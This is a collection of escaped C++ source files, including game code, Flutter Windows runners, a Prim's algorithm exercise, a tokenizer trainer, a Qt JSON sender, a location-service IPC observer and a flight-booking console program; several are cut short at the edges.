rightA.x() <= leftB.x()\t // Amax to the left of Bmin\n\t\t\t\t     || rightA.y() <= leftB.y()\t // Amax to the bottom of Bmin\n\t\t\t\t     || rightB.x() <= leftA.x()\t // Bmax to the left of Amax\n\t\t\t\t     || rightB.y() <= leftA.y(); // Bmax to the bottom of Amin\n\n\t// So return the inverse of not intersecting\n\treturn !notIntercecting;\n}\n\n// TODO: Read\n// https://gamedev.stackexchange.com/questions/38891/making-an-efficient-collision-detection-system/38893#38893\n// TODO: Read\n// https://gamedev.stackexchange.com/questions/38613/how-do-i-detect-collision-between-movie-clips/38635#38635\n// Corners: https://gamedev.stackexchange.com/questions/17502/how-to-deal-with-corner-collisions-in-2d?noredirect=1&lq=1\n// https://gamedev.stackexchange.com/questions/29371/how-do-i-prevent-my-platformers-character-from-clipping-on-wall-tiles?noredirect=1&lq=1\nvoid PhysicsSystem::pushBack(class Scene* scene, const EntityID a, EntityID b) {\n\tassert(a != b);\n\t// Two components cannot be stationary at the same time\n\tassert(!(scene->get<Components::collision>(a).stationary && scene->get<Components::collision>(b).stationary) &&\n\t       \"Hey! I can't resolve the collision of two stationary objects!\");\n\n\t/* Thx stack https://gamedev.stackexchange.com/questions/18302/2d-platformer-collisions\n\t * See https://github.com/MonoGame/MonoGame.Samples/blob/3.8.2/Platformer2D/Platformer2D.Core/Game/Player.cs\n\t * https://github.com/MonoGame/",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <vector>\n#include <cstdlib>\n\n#include <Graphics.hpp>\n#include <System.hpp>\n#include <Window.hpp>\n#include <Audio.hpp>\n#include <Network.hpp>\n\n\n// AMMUNITION\nclass Ammo\n{\npublic:\n    sf::Sprite shape;\n    float speed;\n    float positionY;\n\n    Ammo(float positionY_p, sf::Texture& texture)\n        : speed(10.f)\n    {\n        this->shape.setTexture(texture);\n        this->positionY = positionY_p - this->shape.getGlobalBounds().height/2;\n        this->shape.setPosition(20.f, positionY);\n    }\n\n    void move()\n    {\n        this->shape.move(speed, 0);\n    }\n\n    bool outOfScreen()\n    {\n        if(this->shape.getPosition().x + this->shape.getGlobalBounds().width > 1920)\n            return true;\n        return false;\n    }\n};\n\n// PLAYER\nclass Player\n{\npublic:\n    sf::Sprite shape;\n    sf::Texture playerTex;\n    sf::Texture ammoTex;\n    std::vector<Ammo> bullets;\n\n    float speed;\n    int hp;\n    int shooting_timer = 0;\n\n    Player()\n        : speed(10.f), hp(100)\n    {\n        if (!playerTex.loadFromFile(\"Textures/ship.png\"))\n        {\n            std::cerr << \"Error: Could not load playerTex\" << std::endl;\n            throw(\"Could not load playerTex\");\n        }\n        if (!ammoTex.loadFromFile(\"Textures/ammo.png\"))\n        {\n            std::cerr << \"Error: Could not load ammoTex\" << std::endl;\n            throw(\"Could not load ammoTex\");\n        }\n        this->shape.setTexture(playerTex);\n        this->shape.setPosition(20.f, 0.f);\n    }\n\n    void shoot()\n    {\n        Ammo b1(this->shape.getPosition().y + this->shape.getGlobalBounds().height/2, ammoTex);\n        bullets.push_back(b1);\n    }\n};;\n\nint main()\n{\n    srand(time(NULL));\n\n    sf::RenderWindow window(sf::VideoMode(1920, 1080), \"SFML Works!\", sf::Style::Default);\n    window.setFramerateLimit(120);\n\n\n    Player player;\n\n    // Health bar\n    sf::RectangleShape hp_bar;\n    hp_bar.setFillColor(sf::Color::Red);\n    hp_bar.setSize(sf::Vector2f(500.f, 50.f));\n    hp_bar.setPosition(window.getSize().x/2 - hp_bar.getSize().x/2, 3.f);\n    // Hp bar empty\n    sf::RectangleShape hp_bar_empty;\n    hp_bar_empty.setFillColor(sf::Color::Black);\n    hp_bar_empty.setSize(sf::Vector2f(500.f, 50.f));\n    hp_bar_empty.setPosition(window.getSize().x/2 - hp_bar.getSize().x/2, 3.f);\n    // Hp bar outline\n    sf::RectangleShape hp_bar_outline;\n    hp_bar_outline.setFillColor(sf::Color(190, 190, 190, 255));\n    hp_bar_outline.setSize(sf::Vector2f(506.f, 56.f));\n    hp_bar_outline.setPosition(window.getSize().x/2 - hp_bar.getSize().x/2 - 3.f, 0.f);\n\n    // Enemy\n    sf::Sprite enemy;\n    sf::Texture enemyTex;\n    if (!enemyTex.loadFromFile(\"Textures/enemy.png\"))\n        throw(\"Could not lad enemyTex\");\n    enemy.setTexture(enemyTex);\n    int enemy_spawn_timer = 0;\n    std::vector<sf::Sprite> enemies;\n\n    int score = 0;\n\n    // Font\n    sf::Font font;\n    if(!font.loadFromFile(\"Fonts/Chopsic.otf\"))\n        throw(\"Could not load font\");\n\n    sf::Text scoreUI;\n    scoreUI.setFont(font);\n    scoreUI.setCharacterSize(24);\n    scoreUI.setColor(sf::Color::White);\n    scoreUI.setStyle(sf::Text::Bold);\n    scoreUI.setPosition(10.f, 10.f);\n    scoreUI.setString(\"Score: \" + std::to_string(score));\n\n    while(window.isOpen() && player.hp > 0)\n    {\n        sf::Event event;\n        while(window.pollEvent(event))\n        {\n            if(event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        // Update\n\n        // update score\n        scoreUI.setString(\"Score: \" + std::to_string(score));\n\n        // move player with the mouse\n        player.shape.setPosition(player.shape.getPosition().x,sf::Mouse::getPosition(window).y);\n\n        // shooting\n        if(player.shooting_timer < 10)\n            player.shooting_timer++;\n\n        if(sf::Mouse::isButtonPressed(sf::Mouse::Left) && player.shooting_timer >= 10)\n        {\n            player.shooting_timer = 0;\n            player.shoot();\n        }\n\n        // Move bullets and delete out of bound\n        for(size_t i = 0; i < player.bullets.size(); i++)\n        {\n            player.bullets[i].move();\n            if(player.bullets[i].outOfScreen())\n                player.bullets.erase(player.bullets.begin() + i);\n        }\n\n        // Enemies\n        if(enemy_spawn_timer < 30)\n            enemy_spawn_timer++;\n\n        if(enemy_spawn_timer >= 30)\n        {\n            enemy.setPosition(window.getSize().x, rand() % int(window.getSize().y - enemy.getGlobalBounds().height));\n            enemies.push_back(sf::Sprite(enemy));\n            enemy_spawn_timer = 0;\n        }\n\n        for(size_t i = 0; i < enemies.size(); i++)\n        {\n            enemies[i].move(-4.f, 0.f);\n\n            if(enemies[i].getPosition().x + enemy.getGlobalBounds().width < 100)\n            {\n                enemies.erase(enemies.begin() + i);\n                player.hp = player.hp - 10;\n            }\n        }\n\n        // Colision\n        for(size_t i = 0; i < enemies.size(); i++)\n        {\n            if(player.shape.getGlobal",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"project_two\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<string>\n#include<stdio.h>\n#include<iostream>\n#include<stack>\n#include<bits/stdc++.h>\nusing namespace std;\n#define n 99\n\n\n\nclass Matrix{\n\tpublic :\n\t\tint edge=0;\n\t\tint sum=0;\n\t\tint v=7;\n\t\tint prims(int matrix[7][7],int start);\n};\n\n\n\n\nint Matrix::prims(int matrix[7][7],int start){\n\tint arr[7]={0,0,0,0,0,0,0};\n\tarr[start]=1;\n\twhile(edge!=v-1)\n\t{\t\n\t\tint min=n;\n\t\tint ptr_j;\n\t\tfor(int i=0;i<v;i++)\n\t\t{\n\t\t\tif(arr[i]==0)\n\t\t\t{\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\telse{\n\t\t\t\tfor(int j=0;j<v;j++)\n\t\t\t\t{\n\t\t\t\t\tif(matrix[i][j]<min && matrix[i][j]>0 && arr[j]!=1)\n\t\t\t\t\t{\n\t\t\t\t\t\tmin=matrix[i][j];\n\t\t\t\t\t\tptr_j=j;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tarr[ptr_j]=1;\n\t\tsum+=min;\n\t\tedge++;\n\t\tcout<<\"min= \"<<min;\n\t}\n\t\n\t\n\t\n\t\nreturn sum;\n}\n\n\n\n\n\n\n\n\n\nint main(){\n\tcout<<\"start\";\n\tint start;\n\tcin>>start;\n\tMatrix M;\n\tint matrix[7][7]={\n// j 0\t  1    2\t3\t 4\n\t{0  , 2  , 2  , 0  , 0 , 0 , 0},\n\t{2  , 0  , 1  , 2  , 4 , 0 , 0},\n\t{2  , 1  , 0  , 3  , 0 , 4 , 0},\n\t{0  , 2  , 3  , 0  , 2 , 3 , 0},\n\t{0  , 4  , 0  , 2  , 0 , 2 , 3},\n\t{0  , 0  , 4  , 3  , 2 , 0 , 3},\n\t{0  , 0  , 0  , 0  , 3 , 3 , 0}\n\t};\n\tM.prims(matrix,start);\n\tcout<<\"sum =\"<<M.sum;\n\n\n\n\n\nreturn 0;\n}\n\n",
    "//build inst:\n//g++ -Iexternal/sentencepiece/src -Lexternal/sentencepiece/src -o bpe_tokenizer bpe_trainer.cpp -lsentencepiece -lsentencepiece_train\n#include <sentencepiece_processor.h>\n#include <sentencepiece_trainer.h>\n#include <iostream>\n\nint main(int argc, char *argv[]) {\n    // Check if the user provided a filename\n    if (argc < 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <input_file>\" << std::endl;\n        return 1;\n    }\n\n    // The input file containing the text corpus for training\n    std::string input_file = argv[1];\n\n    // Special tokens\n    const std::string unk_token = \"<unk>\";\n    const std::string eos_token = \"<eos>\";\n    const std::string bos_token = \"<bos>\";\n    const std::string pad_token = \"<pad>\";\n\n    // Vocabulary size\n    int vocab_size = 5000;\n\n    // Training options\n    std::string training_options = \n        \"--input=\" + input_file +\n        \" --model_prefix=bpe_tokenizer\" +\n        \" --vocab_size=\" + std::to_string(vocab_size) +\n        \" --unk_id=0\" +\n        \" --bos_id=1\" +\n        \" --eos_id=2\" +\n        \" --pad_id=3\" +\n        \" --character_coverage=1.0\" +\n        \" --model_type=bpe\";\n\n    // Train the BPE tokenizer\n    sentencepiece::SentencePieceTrainer::Train(training_options);\n\n    std::cout << \"BPE tokenizer trained successfully!\" << std::endl;\n\n    return 0;\n}\n",
    "/*\n Created on 2024-08-08 by TheTepidCoder\n Purpose: To be a fake \"chatroom\" class\n which would handle some messages between\n connected users by forwarding a queue\n of messages to propogate to all connected\n clients' sockets with source information.\n\n In reality, this exists only to depend\n upon the date_time class object and store\n its contents in a std::vector<date_time>\n (or something that encapsulates the\n date_time object -- the user class defined\n hereinbelow). This will cause undefined\n behavior when this is compiled with an\n old version of the date_time class, if\n the class header file has a date_time\n class which differs. E.g. if it's\n compiled and linked against a version\n of date_time_utilities.dll, and a newer\n version of that dll is what is loaded\n at run-time by the consumer of this\n chatroom.dll, then that is an error.\n*/\n#include \"date_time_utility.h\"\n#include \"chatroom.h\"\n\nuser::user (  ) {  }\n\nuser::user (\n  const char *lpsz_name,\n  const CONNECTION_INFORMATION &connection_information\n) :\n  m_str_name ( lpsz_name ),\n  m_connection_information ( connection_information )\n{\n}\n\nuser::~user (  ) {\n}\n\nbool user::name ( const char *lpsz_name ) {\n  try {\n    m_str_name = lpsz_name ? lpsz_name : \"\";\n  } catch ( std::exception &e ) {\n    std::cerr << \"Exception: \\\"\" << e .what (  ) << \"\\\"\" << std::endl;\n    return false;\n  }\n  return true;\n}\n\nconst char *user::name ( void ) const noexcept {\n  return m_str_name .c_str (  );\n}\n\n[[nodiscard]] const CONNECTION_INFORMATION &user::get_connection_information ( void ) const noexcept {\n  return m_connection_information;\n}\n\n\n\n\nchatroom::chatroom(){}\nchatroom::~chatroom(){}\nbool chatroom::add_user (\n  const char *lpsz_name,\n  const CONNECTION_INFORMATION &connection_information\n) {\n  try {\n    //number of elements * size of a single element = total size in bytes\n    m_vec_users .emplace_back ( lpsz_name, connection_information );\n  }\n  catch ( std::exception &e ) {\n    std::cerr << \"Exception: \\\"\" << e .what (  ) << \"\\\"\\n\" << std::endl;\n    return false;\n  }\n\n  return true;\n}\nconst std::vector<user> &chatroom::users ( void ) const noexcept {\n  return m_vec_users;\n}\n",
    "/* Copyright (c) 2017-2020 The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation, nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n#define LOG_TAG \"LocSvc_XtraSystemStatusObs\"\n\n#include <sys/stat.h>\n#include <sys/un.h>\n#include <errno.h>\n#include <ctype.h>\n#include <cutils/properties.h>\n#include <math.h>\n#include <arpa/inet.h>\n#include <netinet/in.h>\n#include <netdb.h>\n#include <string>\n#include <loc_log.h>\n#include <loc_nmea.h>\n#include <SystemStatus.h>\n#include <vector>\n#include <sstream>\n#include <XtraSystemStatusObserver.h>\n#include <LocAdapterBase.h>\n#include <DataItemId.h>\n#include <DataItemsFactoryProxy.h>\n#include <DataItemConcreteTypesBase.h>\n\nusing namespace loc_util;\nusing namespace loc_core;\n\n#ifdef LOG_TAG\n#undef LOG_TAG\n#endif\n#define LOG_TAG \"LocSvc_XSSO\"\n\nclass XtraIpcListener : public ILocIpcListener {\n    IOsObserver*    mSystemStatusObsrvr;\n    const MsgTask* mMsgTask;\n    XtraSystemStatusObserver& mXSSO;\npublic:\n    inline XtraIpcListener(IOsObserver* observer, const MsgTask* msgTask,\n                           XtraSystemStatusObserver& xsso) :\n            mSystemStatusObsrvr(observer), mMsgTask(msgTask), mXSSO(xsso) {}\n    virtual void onReceive(const char* data, uint32_t length,\n                           const LocIpcRecver* recver) override {\n#define STRNCMP(str, constStr) strncmp(str, constStr, sizeof(constStr)-1)\n        if (!STRNCMP(data, \"ping\")) {\n            LOC_LOGd(\"ping received\");\n#ifdef USE_GLIB\n        } else if (!STRNCMP(data, \"connectBackhaul\")) {\n            char clientName[30] = {0};\n            sscanf(data, \"%*s %29s\", clientName);\n            mSystemStatusObsrvr->connectBackhaul(string(clientName));\n        } else if (!STRNCMP(data, \"disconnectBackhaul\")) {\n            char clientName[30] = {0};\n            sscanf(data, \"%*s %29s\", clientName);\n            mSystemStatusObsrvr->disconnectBackhaul(string(clientName));\n#endif\n        } else if (!STRNCMP(data, \"requestStatus\")) {\n            int32_t xtraStatusUpdated = 0;\n            sscanf(data, \"%*s %d\", &xtraStatusUpdated);\n\n            struct HandleStatusRequestMsg : public LocMsg {\n                XtraSystemStatusObserver& mXSSO;\n                int32_t mXtraStatusUpdated;\n                inline HandleStatusRequestMsg(XtraSystemStatusObserver& xsso,\n                                              int32_t xtraStatusUpdated) :\n                        mXSSO(xsso), mXtraStatusUpdated(xtraStatusUpdated) {}\n                inline void proc() const override {\n                    mXSSO.onStatusRequested(mXtraStatusUpdated);\n                    /* SSR for DGnss Ntrip Source*/\n                    mXSSO.restartDgnssSource();\n                }\n            };\n            mMsgTask->sendMsg(new HandleStatusRequestMsg(mXSSO, xtraStatusUpdated));\n        } else {\n            LOC_LOGw(\"unknown event: %s\", data);\n        }\n    }\n};\n\nXtraSystemStatusObserver::XtraSystemStatusObserver(IOsObserver* sysStatObs,\n                                                   const MsgTask* msgTask) :\n        mSystemStatusObsrvr(sysStatObs), mMsgTask(msgTask),\n        mGpsLock(-1), mConnections(~0), mXtraThrottle(true),\n        mReqStatusReceived(false),\n        mIsConnectivityStatusKnown(false),\n        mSender(LocIpc::getLocIpcLocalSender(LOC_IPC_XTRA)),\n        mDelayLocTimer(*mSender) {\n    subscribe(true);\n    auto recver = LocIpc::getLocIpcLocalRecver(\n            make_shared<XtraIpcListener>(sysStatObs, msgTask, *this),\n            LOC_IPC_HAL);\n    mIpc.startNonBlockingListening(recver);\n    mDelayLocTimer.st",
    "#include \"mainwindow.h\"\n#include \"./ui_mainwindow.h\"\n#include <QJsonDocument>\n\n\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    httpsSender = new HttpsSender(this);\n    connect(&crushJson,&CrushJson::jsonFileCreated, this, &MainWindow::addJsonToLogs);\n    connect(&crushJson,&CrushJson::jsonFileCreated, httpsSender, &HttpsSender::getJson);\n    connect(httpsSender, &HttpsSender::responseReceived, this, &MainWindow::addResponseToLogs);\n    connect(httpsSender, &HttpsSender::errorReceived, this, &MainWindow::addErrorToLogs);\n    setMaximumSize(800, 500);\n}\n\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n\nvoid MainWindow::on_pushButtonAutoFillSrt_clicked()\n{\n    ui->lineEditHeaderType->setText(\"SRT-22\");\n}\n\n\nvoid MainWindow::on_pushButtonAutoFillOdt_clicked()\n{\n    ui->lineEditHeaderType->setText(\"ODT-22\");\n}\n\n\nvoid MainWindow::on_pushButtonAutoFillRww31_clicked()\n{\n    ui->lineEditHeaderType->setText(\"RWW-31\");\n}\n\n\nvoid MainWindow::on_pushButtonCreateJson_clicked()\n{\n    qDebug()<<\"Creating Json file..\";\n\n    crushJson.setHeaderID(ui->lineEditHeaderId->text());\n    crushJson.setHeaderType(ui->lineEditHeaderType->text());\n    crushJson.setJsonRegister(ui->lineEditRegister->text());\n    crushJson.setConfigString(ui->lineEditHeadString->text());\n\n    crushJson.createJsonFile();\n}\n\n\nvoid MainWindow::on_pushButtonSetUrl_clicked()\n{\n    httpsSender->setUrl(ui->lineEditAddress->text());\n}\n\nvoid MainWindow::addJsonToLogs(QJsonObject &json)\n{\n    QJsonDocument doc(json);\n    QString strJson(doc.toJson(QJsonDocument::Compact));\n    ui->textEditLogs->setTextColor(QColorConstants::Green);\n    ui->textEditLogs->append(strJson + \"\\n\");\n    ui->textEditLogs->setTextColor(QColorConstants::White);\n}\n\nvoid MainWindow::addResponseToLogs(QString &response)\n{\n    ui->textEditLogs->setTextColor(QColorConstants::Yellow);\n    ui->textEditLogs->append(response + \"\\n\");\n    ui->textEditLogs->setTextColor(QColorConstants::White);\n}\n\nvoid MainWindow::addErrorToLogs(QString &error)\n{\n    ui->textEditLogs->setTextColor(QColorConstants::Red);\n    ui->textEditLogs->append(error + \"\\n\");\n    ui->textEditLogs->setTextColor(QColorConstants::White);\n}\n\n\nvoid MainWindow::on_pushButtonCleanLogs_clicked()\n{\n    ui->textEditLogs->clear();\n}\n\nvoid MainWindow::on_pushButtonSendCrush_clicked()\n{\n    httpsSender->sendRequest();\n}\n\n\nvoid MainWindow::on_pushButtonDefault_clicked()\n{\n\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ecom_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <iomanip>\nusing namespace std;\n\nvoid mainmenu();\n\nclass Management\n{\npublic:\n    Management()\n    {\n        mainmenu();\n    }\n};\n\nclass Detail\n{\npublic:\n    static string gender, name;\n    static int cID;\n    double phone_no;\n    int age;\n    string address;\n    char arr[100];\n\n    void information()\n    {\n        cout << \"Enter the Customer ID: \";\n        cin >> cID;\n        cout << \"Enter the Name: \";\n        cin >> name;\n        cout << \"Enter the Age: \";\n        cin >> age;\n        cout << \"Enter the Phone no.: \";\n        cin >> phone_no;\n        cout << \"Enter the Address: \";\n        cin.ignore();\n        getline(cin, address);\n        cout << \"Enter the Gender: \";\n        cin >> gender;\n        cout << endl;\n        cout << \"Your Details Stored Successfully!\" << endl\n             << endl;\n    }\n};\n\nint Detail::cID;\nstring Detail::gender;\nstring Detail::name;\n\nclass Registration\n{\npublic:\n    static int choice;\n    static float charges;\n    int choice1;\n    int back;\n\n    void flights()\n    {\n        string flights[] = {\"Dubai\", \"Canada\", \"UK\", \"USA\", \"Australia\", \"Europe\"};\n        cout << \"___________Welcome to the Airlines!_____________\" << endl\n             << endl;\n        for (int i = 0; i < 6; i++)\n        {\n            cout << (i + 1) << \". \" << flights[i] << endl;\n        }\n        cout << endl;\n        cout << \"Press the no. of your country to book the flight: \";\n        cin >> choice;\n        cout << endl;\n        cout << \"Following are the Flights.\" << endl\n             << endl;\n\n        switch (choice)\n        {\n        case 1:\n\n            cout << \"_____________Welcome to Dubai Emirates_____________\" << endl\n                 << endl;\n            cout << \"Your Comfort is our Priority. Enjoy the Journey!\" << endl\n                 << endl;\n            cout << \"1.DUB - 498\" << endl;\n            cout << \"\\t 7/8/2024 8:00AM 10hrs Rs. 14000\" << endl;\n            cout << \"2.DUB - 538\" << endl;\n            cout << \"\\t 8/8/2024 9:00AM 11hrs Rs. 13000\" << endl;\n            cout << \"3.DUB - 658\" << endl;\n            cout << \"\\t 1/8/2024 3:40PM 11hrs Rs. 15000\" << endl;\n            cout << endl;\n            cout << \"Select the Flight you want to book by entering the no.: \";\n            cin >> choice1;\n            cout << endl;\n            if (choice1 == 1)\n            {\n\n                charges = 14000;\n                cout << \"You have Successfully Booked the Flight DUB - 498\" << endl;\n            }\n            else if (choice1 == 2)\n            {\n                charges = 13000;\n                cout << \"You have Successfully Booked the Flight DUB - 538\" << endl;\n            }\n            else if (choice1 == 3)\n            {\n                charges = 15000;\n                cout << \"You have Successfully Booked the Flight DUB - 658\" << endl;\n            }\n            else\n            {\n                cout << \"Invalid Input, Returning to Main Menu\" << endl;\n                mainmenu();\n            }\n            break;\n        case 2:\n            cout << \"_____________Welcome to Canada Airlines_____________\" << endl\n                 << endl;\n            cout << \"Your Comfort is our Priority. Enjoy the Journey!\" << endl\n                 << endl;\n            cout << \"1.CA - 328\" << endl;\n            cout << \"\\t 5/8/2024 1:00AM 29hrs Rs. 29000\" << endl;\n            cout << \"2.CA - 593\" << endl;\n            cout << \"\\t 9/8/2024 9:40AM 31hrs Rs. 28000\" << endl;\n            cout << \"3.CA - 891\" << endl;\n            cout << \"\\t 1/8/2024 7:20PM 30hrs Rs. 35000\" << endl;\n            cout << endl;\n            cout << \"Select the Flight you want to book by entering the no.: \";\n            cin >> choice1;\n            cout << endl;\n            if (choice1 == 1)\n            {\n                charges = 29000;\n                cout << \"You have Successfully Booked the Flight CA - 328\" << endl;\n            }\n            else if (choice1 == 2)\n            {\n                charges = 28000;\n                cout << \"You have Successfully Booked the Flight CA - 593\" << endl;\n            }\n            else if (choice1 == 3)\n            {\n                charges = 35000;\n                cout << \"You have Successfully Booked the Flight CA - 891\" << endl;\n            }\n            else\n            {\n                cout << \"Invalid Input, Returning to Main Menu\" << endl;\n                mainmenu();\n            }\n            break;\n        case 3:\n            cout << \"_____________Welcome to UK Airways_____________\" << endl\n                 << endl;\n            cout << \"Your Comfort is our Priority. Enjoy the Journey!\" << endl\n                 << endl;\n            cout << \"1.UK - 638\" << endl;\n            cout << \"\\t 12/8/2024 1:30PM 14hrs Rs. 44000\" << endl;\n            cout << endl;\n            cout << \"Select the Flight you want to book by entering the no.: \";\n            cin >> choice1;\n            cout << endl;\n            if (choice1 == 1)\n            {\n                charges",
    "#include <iostream>\n#include \"Node.h\"\n\ntemplate<class T>\nclass DoublyLinkedList {\nprivate:\n    Node* head;\n    int count;\npublic:\n    DoublyLinkedList();\n    void InsertAt(T elemenet, int i);\n    void InsertFirst(T elemenet);\n    void InsertLast(T element);\n    void DeleteAt(int i);\n    void DeleteFirst();\n    void DeleteLast();\n    void Display();\n};\n\ntemplate<class T>\nDoublyLinkedList<T>::DoublyLinkedList() {\n    count = 0;\n    head = nullptr;\n}\n\ntemplate<class T>\nvoid DoublyLinkedList<T>::InsertAt(T elemenet, int i)\n{\n}\n\ntemplate<class T>\nvoid DoublyLinkedList<T>::InsertFirst(T elemenet)\n{\n}\n\ntemplate<class T>\nvoid DoublyLinkedList<T>::InsertLast(T element)\n{\n}\n\ntemplate<class T>\nvoid DoublyLinkedList<T>::DeleteAt(int i)\n{\n}\n\ntemplate<class T>\nvoid DoublyLinkedList<T>::DeleteFirst()\n{\n}\n\ntemplate<class T>\nvoid DoublyLinkedList<T>::DeleteLast()\n{\n}\n\ntemplate<class T>\nvoid DoublyLinkedList<T>::Display()\n{\n}\n\nint main()\n{\n    const int size = 10;\n\n    DoublyLinkedList<int> list = DoublyLinkedList<int>();\n\n    for (int i = 0; i < size; i++)\n    {\n        list.InsertAt(i, i);\n    }\n\n    list.Display();\n\n    return 0;\n}\n\n",
